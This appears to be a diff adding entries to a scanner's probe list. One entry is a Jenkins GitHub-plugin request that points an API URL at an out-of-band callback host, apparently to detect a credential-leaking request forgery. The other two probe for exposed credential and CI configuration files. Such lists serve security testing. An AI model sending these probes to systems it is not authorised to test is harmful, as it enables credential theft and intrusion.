@@ -1,0 +1,3 @@
+/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://{{interactsh-url}}
+/.git-credentials
+/.gitlab-ci.yml
